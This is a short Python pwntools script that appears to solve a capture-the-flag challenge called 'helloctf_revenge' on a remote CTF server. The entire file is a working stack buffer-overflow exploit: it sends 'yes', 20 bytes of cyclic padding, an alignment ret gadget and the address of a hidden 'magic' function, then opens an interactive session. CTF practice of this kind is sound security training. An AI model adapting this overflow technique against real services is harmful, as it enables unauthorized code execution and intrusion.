#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

#p = process ('./helloctf_revenge')
p = remote('ctf.adl.tw', 10001)

pause ()

magic = 0x000000000040125b
init_ret = 0x40101a

payload = flat (
        b"yes\0",
        cyclic (0x14),  # (hex) 0x14 = (decimal) 20
        init_ret,
        magic
)

p.sendlineafter (b"Do you like VTuber?\n", payload)

p.interactive ()
p.close ()